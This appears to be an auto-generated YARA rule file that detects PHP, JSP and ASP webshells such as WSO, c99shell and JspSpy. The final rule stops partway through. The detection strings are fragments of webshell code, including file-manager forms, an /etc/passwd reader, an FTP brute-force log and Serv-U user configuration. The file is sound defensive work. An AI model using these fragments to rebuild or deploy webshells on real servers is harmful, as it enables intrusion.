rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_0_wso_4_2_1_wso2_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_404_318 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.0.php, wso-4.2.1.php, wso2.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso_404.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "b4c76bead50773295dc09fc006ec5143c7aa3558db7c96cccddb8ab180f8d63b"
      hash6 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash7 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash8 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash9 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash10 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash11 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash12 = "fd3db2020e82517d8fbfcc8dd3399efbdf82057353b94509995bba128030d193"
   strings:
      $s1 = "                    echo \"<script>d.sf.onsubmit=function(){st(\\\"\" . $_POST['p2'] . \"\\\", d.sf.p3.value)}</script><span>\"." ascii
      $s2 = "<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='" ascii
      $s3 = "g(\\\"FilesMan\\\",null,\\\"s_name_\".($sort[1]?0:1).\"\\\")'>Name</a></th><th><a href='#' onclick='g(\\\"FilesMan\\\",null,\\\"" ascii
      $s4 = "    var a_ = '\" . htmlspecialchars(@$_POST['a']) .\"'" fullword ascii
      $s5 = "er/Group</th><th><a href='#' onclick='g(\\\"FilesMan\\\",null,\\\"s_perms_\".($sort[1]?0:1).\"\\\")'>Permissions</a></th><th>Act" ascii
      $s6 = "1]?0:1).\"\\\")'>Size</a></th><th><a href='#' onclick='g(\\\"FilesMan\\\",null,\\\"s_modify_\".($sort[1]?0:1).\"\\\")'>Modify</a" ascii
      $s7 = "                <td><input type=checkbox name=sql_count value='on'\" . (empty($_POST['sql_count'])?'':' checked') . \"> count th" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_ng_319 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso-ng.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash6 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash7 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash8 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash9 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash10 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash11 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash12 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
   strings:
      $s1 = "<form method='post' target='_blank' name='hf'>" fullword ascii
      $s2 = "cmds.push('');" fullword ascii
      $s3 = "echo \"</div><br><h1>Search for hash:</h1><div class=content>" fullword ascii
      $s4 = "<form onsubmit=\\\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\\\"><table cellpadding='1' cell" ascii
      $s5 = "<form onsubmit=\\\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\\\"><table cellpadding='1' cell" ascii
      $s6 = "echo \"<h1>Network tools</h1><div class=content>" fullword ascii
      $s7 = "<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>" fullword ascii
      $s8 = "</table></form>\";" fullword ascii
      $s9 = "<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>" fullword ascii
      $s10 = "ing='0' width='50%'>" fullword ascii
      $s11 = "</form></div>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _G5_1n73ction_zacosmall_320 {
   meta:
      description = "webshell - from files G5.php, 1n73ction.php, zacosmall.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8442b9e1aa672ef4aca99eb2ee61ca7a81c3ee6e73d815c0f88d94df4c0a46c0"
      hash2 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash3 = "addb8577594a550a3c7853251ea227df7af8c8a0878d3461020226bd3e1dd9ba"
   strings:
      $s1 = "$perms .= ($mode & 00040) ? 'r' : '-';" fullword ascii
      $s2 = "$perms .= ($mode & 00004) ? 'r' : '-';" fullword ascii
      $s3 = "$perms='';" fullword ascii
      $s4 = "$perms .= ($mode & 00100) ? 'x' : '-';" fullword ascii
      $s5 = "$perms .= ($mode & 00010) ? 'x' : '-';" fullword ascii
      $s6 = "$perms .= ($mode & 00400) ? 'r' : '-';" fullword ascii
      $s7 = "$perms .= ($mode & 00200) ? 'w' : '-';" fullword ascii
      $s8 = "return $perms;" fullword ascii
      $s9 = "$perms .= ($mode & 00020) ? 'w' : '-';" fullword ascii
      $s10 = "$perms .= ($mode & 00001) ? 'x' : '-';" fullword ascii
      $s11 = "$perms .= ($mode & 00002) ? 'w' : '-';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99v2_c99shell_c99_321 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, c99shell.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $x1 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s2 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $s3 = " $out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s4 = "   $logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s5 = "  header(\"WWW-Authenticate: Basic realm=\\\"c99shell \".$shver.\": \".$login_txt.\"\\\"\");" fullword ascii
      $s6 = "$accessdeniedmess = \"<a href=\\\"http://ccteam.ru/releases/c99shell\\\">c99shell v.\".$shver.\"</a>: access denied\";" fullword ascii
      $s7 = "# Home page: http://ccteam.ru" fullword ascii
      $s8 = "$md5_pass = \"\"; //md5-cryped pass. if null, md5($pass)" fullword ascii
      $s9 = "else {$surl = $_REQUEST[\"c99sh_surl\"]; //Set this cookie for manual SURL" fullword ascii
      $s10 = " <a href=\\\"#\\\" onclick=\\\"document.c99sh_sqlquery.sql_query.value+='`\".$name.\"`';\\\"><b>\".$name.\"</b></a><br>\";}" fullword ascii
      $s11 = "//Authentication" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _c66_c99v2_c99shell_ctt_sh_Shell__ci___Biz_was_here_c99_322 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, c99shell.php, ctt_sh.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
      hash5 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = " echo \"<b>Ftp Quick brute:</b><br>\";" fullword ascii
      $s2 = "<br><b>Search in (explode \\\";\\\"): </b><input type=\\\"text\\\" name=\\\"search_in\\\" size=\\\"\".round(strlen($search_in)+2" ascii
      $s3 = " $arr_cut = $sess_data[\"cut\"];" fullword ascii
      $s4 = " $arr_copy = $sess_data[\"copy\"];" fullword ascii
      $s5 = " $arr = array_merge($arr_copy,$arr_cut);" fullword ascii
      $s6 = " if (count($arr) == 0) {echo \"<center><b>Buffer is empty!</b></center>\";}" fullword ascii
      $s7 = "if ($act == \"fsbuff\")" fullword ascii
      $s8 = "<br><br><b>Text:</b><br><textarea name=\\\"search_text\\\" cols=\\\"122\\\" rows=\\\"10\\\">\".htmlspecialchars($search_text).\"" ascii
      $s9 = "\".htmlspecialchars($search_in).\"\\\">" fullword ascii
      $s10 = "</b></center></td>\";" fullword ascii
      $s11 = "if (!$win)" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _WSO_4_0_5_wso_4_1_3_wso_323 {
   meta:
      description = "webshell - from files WSO_4_0_5.php, wso-4.1.3.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash2 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash3 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "pe=submit value=\">>\"></form><br><span>Posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",t" ascii
      $s2 = "echo '<span>Copy (read file)</span><form onsubmit=\\'g(null,null,\"1\",this.param.value);return false;\\'><input type=text name=" ascii
      $s3 = " false;\\'><input type=text name=param><input type=submit value=\">>\"></form><br><span>Curl (read file)</span><form onsubmit=" ascii
      $s4 = "<td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=\">>\"></form><br><br><span>Imap_open (re" ascii
      $s5 = "echo '<span>Copy (read file)</span><form onsubmit=\\'g(null,null,\"1\",this.param.value);return false;\\'><input type=text name=" ascii
      $s6 = "store (read file)</span><form onsubmit=\\'g(null,null,\"4\",this.param.value);return false;\\'><input type=text name=param><inpu" ascii
      $s7 = "am1.value,this.param2.value);return false;\\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td" ascii
      $s8 = "alue=\">>\"></form>';" fullword ascii
      $s9 = "ull,null,\"3\",this.param.value);return false;\\'><input type=text name=param><input type=submit value=\">>\"></form><br><span>I" ascii
      $s10 = " file)</span><form onsubmit=\\'g(null,null,\"6\",this.param.value);return false;\\'><input type=text name=param><input type=subm" ascii
      $s11 = "m><input type=submit value=\">>\"></form><br><span>Glob (list dir)</span><form onsubmit=\\'g(null,null,\"2\",this.param.value);r" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _spexec_sql_324 {
   meta:
      description = "webshell - from files spexec.aspx, sql.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b0a31a7937be01fb4fe8705344b32bc0a7b3733639c615a3b400d3fc1bd1d7e3"
      hash2 = "6f3261eaaabf369bd928d179641b73ffd768184dfd4e00124da462a3075d4239"
   strings:
      $s1 = "<%@ Import namespace=\"System.Data\"%>" fullword ascii
      $s2 = "<%@ Import namespace=\"System.Data.SqlClient\"%>" fullword ascii
      $s3 = "<script runat=\"server\" language=\"c#\">" fullword ascii
      $s4 = "            SqlCommand sqlCommand = null;" fullword ascii
      $s5 = "            if (txtAuthKey.Text != AUTHKEY)" fullword ascii
      $s6 = "        SqlConnection sqlConnection = null;" fullword ascii
      $s7 = "            if (sqlConnection != null)" fullword ascii
      $s8 = "            sqlConnection = new SqlConnection();" fullword ascii
      $s9 = "            sqlConnection.Open();" fullword ascii
      $s10 = "                sqlConnection.Dispose();" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 40KB and ( all of them )
      ) or ( all of them )
}

rule _c5_m_he1p_1_nogfw_JspSpy1_403_luci_jsp_spy2009_queryDong_myxx1_a_config_JspSpyJDK5_JspSpyJDK51_u_000_css_807_jspspy_k8_jsps_325 {
   meta:
      description = "webshell - from files c5.jsp, m.jsp, he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, 403.jsp, luci.jsp.spy2009.jsp, queryDong.jsp, myxx1.jsp, a.jsp, config.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, 000.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, zend.jsp, ma3.jsp, spyjsp2010.jsp, ok.jsp, style.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash3 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash4 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash6 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash7 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash9 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash10 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash11 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash12 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash13 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash14 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash15 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash16 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash17 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash18 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash19 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash20 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash21 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash22 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash23 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash24 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
      hash25 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
      hash26 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash27 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash28 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash29 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash30 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $s1 = "sis = request.getInputStream();" fullword ascii
      $s2 = "String savePath = request.getParameter(\"savepath\");" fullword ascii
      $s3 = "String downFileUrl = request.getParameter(\"url\");" fullword ascii
      $s4 = "int len = in.read(data);" fullword ascii
      $s5 = "len = in.read(data);" fullword ascii
      $s6 = "URLConnection conn = downUrl.openConnection();" fullword ascii
      $s7 = "URL downUrl = new URL(downFileUrl);" fullword ascii
      $s8 = "FileInputStream fInput = new FileInputStream(f);" fullword ascii
      $s9 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword ascii
      $s10 = "String s = \"\";" fullword ascii
      $s11 = "int k = 0;" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_asp__1__vps_r00tsFSO_326 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, asp (1).asp, vps.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash4 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash5 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "'leaves = leaves & \"-SETDOMAIN\" & vbcrlf & \"-Domain=cctv|0.0.0.0|43859|-1|1|0\" & vbcrlf & \"-TZOEnable=0\" & vbcrlf & \" TZO" ascii
      $s2 = "'leaves = leaves & \"-SETDOMAIN\" & vbcrlf & \"-Domain=cctv|0.0.0.0|43859|-1|1|0\" & vbcrlf & \"-TZOEnable=0\" & vbcrlf & \" TZO" ascii
      $s3 = "Sub ScanDrive(Drive) " fullword ascii
      $s4 = "Sub ScFolder(folder) " fullword ascii
      $s5 = "Message \"" fullword ascii
      $s6 = "\",Scmsg,1" fullword ascii
      $s7 = ":<input name='tuser' type='text' class='TextBox' id='tuser' value='1'><br>\"" fullword ascii
      $s8 = ":<input name='tpass' type='text' class='TextBox' id='pass' value='1'><br>\"" fullword ascii
      $s9 = "</B></TD>\"" fullword ascii
      $s10 = "'leaves = leaves & \"quit\" & vbcrlf" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _asp___1__4_0_2013110125027897_asp__1___2014_10_23_14_54_16__2014_NEW_Web_327 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, 4.0.asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, _2014.asp, NEW WebShell (1).asp, asp (1).asp, 2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, asp (1).asp, .asp, asp.asp, UnKnown Vip.asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, _2012.asp, .asp, vps.asp, NEW WebShell.asp,  (1).asp,  (1)__2014-10-23-14-54-16.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash4 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash5 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash6 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash7 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash8 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash9 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash10 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash11 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash12 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash13 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash14 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash15 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash16 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash17 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash18 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash19 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash20 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash21 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash22 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash23 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash24 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash25 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
      hash26 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "newuser=replace(newuser,\"c:\",f)" fullword ascii
      $s2 = "RndNumber=Int((Max - Min + 1) * Rnd() + Min) " fullword ascii
      $s3 = "Randomize " fullword ascii
      $s4 = "</center>\"" fullword ascii
      $s5 = "timeout=3" fullword ascii
      $s6 = "function Gpath()" fullword ascii
      $s7 = "f=gpath()" fullword ascii
      $s8 = "f=trim(request(\"f\"))" fullword ascii
      $s9 = "\" Then" fullword ascii /* Goodware String - occured 2 times */
      $s10 = "if f=\"\" then" fullword ascii
      $s11 = "select case SUaction" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_asp__1__asp__1__asp_asp__1___2014_328 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, asp (1).asp, asp (1).asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp, vps.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash4 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash5 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash6 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash7 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
   strings:
      $s1 = "rrs\".cmd{background-color:#000;color:#FFF}\"" fullword ascii
      $s2 = " FONT-FAMILY: verdana; BORDER-RIGHT-WIDTH: 1px; BORDER-RIGHT-COLOR: #008000}\"" fullword ascii
      $s3 = "rrs\"a{color:#008000;text-decoration: none;}a:hover{color:#00ff00;background:#000}\"" fullword ascii
      $s4 = "rrs\"body{margin: 0px;margin-left:4px;}\"" fullword ascii
      $s5 = "rrs\".C{background-color:#000;border:0px}\"" fullword ascii
      $s6 = "rrs\"input,select,textarea{BORDER-TOP-WIDTH: 1px; FONT-WEIGHT: bold; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 12px; BORDER-LEFT-COLOR:" ascii
      $s7 = "rrs\"</style>\"" fullword ascii
      $s8 = "rrS\"<style type=\"\"text/css\"\">\"" fullword ascii
      $s9 = "rrs\".am{color:#888;font-size:12px;}\"" fullword ascii
      $s10 = "rRs\"</style>\"" fullword ascii
      $s11 = "rrs\"hr{color:#00ff00}\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _2014__2013____1__r00tsFSO_329 {
   meta:
      description = "webshell - from files 2014.asp, .asp, 2013.asp, .asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash2 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash3 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash4 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash5 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash6 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "u=request.servervariables(\"http_host\")&url" fullword ascii
      $s2 = "Call Scan(ip(hu), tmp(i))" fullword ascii
      $s3 = "dim Folders,keyword,objFso,Counter" fullword ascii
      $s4 = "If Isnumeric(tmp(i)) Then " fullword ascii
      $s5 = "Call Scan(ip(hu), j)" fullword ascii
      $s6 = "thetime=cstr(int(timer2-timer1))" fullword ascii
      $s7 = "sub SavePower(PowerPath,SaveType)" fullword ascii
      $s8 = "If Isnumeric(startN) and Isnumeric(endN) Then" fullword ascii
      $s9 = "If seekx > 0 Then" fullword ascii
      $s10 = "RRePath=Replace(S,\"\\\\\",\"\\\")" fullword ascii
      $s11 = ":</b><br><hr>\")" fullword ascii
   condition:
      ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _indexx_r00tsFSO_330 {
   meta:
      description = "webshell - from files indexx.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
      hash2 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "\"-QuotaEnable=0\"&vbCrLf&\"-MaxUsersLoginPerIP=-1\"&vbCrLf&\"-SpeedLimitUp=0\"&vbCrLf&\"-SpeedLimitDown=0\"&vbCrLf&_" fullword ascii
      $s2 = "\"-NeedSecure=0\"&vbCrLf&\"-HideHidden=0\"&vbCrLf&\"-AlwaysAllowLogin=0\"&vbCrLf&\"-ChangePassword=0\"&vbCrLf&_" fullword ascii
